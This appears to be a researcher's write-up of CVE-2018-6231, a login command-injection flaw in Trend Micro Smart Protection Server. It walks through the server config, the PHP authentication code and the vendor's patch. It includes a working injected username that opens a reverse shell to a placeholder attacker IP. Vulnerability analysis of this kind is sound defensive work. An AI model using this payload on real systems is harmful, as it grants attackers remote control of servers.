# CVE-2018-6231 
* Title: Trend Micro Smart Protection Server Auth Command Injection Authentication Bypass Vulnerability 
* CVE-ID: CVE-2018-6231 
* Affected Product: Smart Protection Server (Standalone) 
* Description: The specific flaw exists within the handling of credentials provided at login. When parsing the username, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to escalate privileges to resources normally protected from the user. 

---- 


```
CRCservice.document-root    = "/var/www/iCRC"
var.AdminUI.document-root    = "/var/www/AdminUI"
server.document-root        = var.iCRCservice.document-root
...

$SERVER["socket"] == "0.0.0.0:4343" {
ssl.engine = "enable"
ssl.pemfile = "/etc/lighttpd/server.pem"
ssl.cipher-list = ssl-cipher-list
accesslog.filename = "/var/log/lighttpd/mgt_access.log"
server.document-root        = var.AdminUI.document-root
fastcgi.server             = ( ".php" =>
                               ( "localhost" =>
                                 (
                                   "socket" => "/tmp/php-fastcgi.socket",
                                   "bin-path" => "/usr/bin/php-cgi",
                                   "max-procs" => 4,
                                   "allow-x-send-file" => "enable",
                                   "bin-environment" =>
                                   (
                                     "PHP_FCGI_CHILDREN" => "8",
                                     "PHP_FCGI_MAX_REQUESTS" => "1000"
                                   )
                                 )
                               )
                            )
}
``` 

By doing a grep on instances of iLogin in `AdminUI` I found the following line: 

`exec("/usr/tmcss/bin/iLogin $account $password", $output, $return_var);` 

As mentioned in the description of vulnerability, `exec` is the syscall that
username passed to it. By taking a look at `AdminUI/auth.php` we have the
following code:

```php
$words = explode("\t", $decrypted);
$account = escapeshellarg($words[0]);
$password = escapeshellarg($words[1]);
$client_nonce = $words[2];

...

$output = array();
$return_var = 1;
$remote_ip=$_SERVER['REMOTE_ADDR'];

exec("/usr/tmcss/bin/iLogin $account $password", $output, $return_var);

...
``` 

Username stored in `$account` variable which `escapeshellarg` applied on it.
`escapeshellarg` simply put single quotes surrounding anything passed to it
which means it will secure the `exec` execution in PHP world. However, this
parameter is passed to iLogin script. We can perform an argument injection
attack to inject our malicious payload into the shell script. 

```bash
#!/usr/bin/expect

if {[llength $argv]!=2} {
	exit 1
}

set password [lindex $argv 1]
...

``` 

For example, the following will provide a reverse-shell from the server on our
listening port (3131): 

`]!=2}{};/bin/bash -i >& /dev/tcp/[ATTACKER_IP]/3131 0>&1` 

Later on they checked to make sure that user cannot pass more than one argument
to the shell by adding the following to the patch: 

```bash
if [ $# -ne 2 ]
then
	exit 1
fi;

if ! id "$1" >/dev/null 2>&1; then
	exit 1
fi
``` 
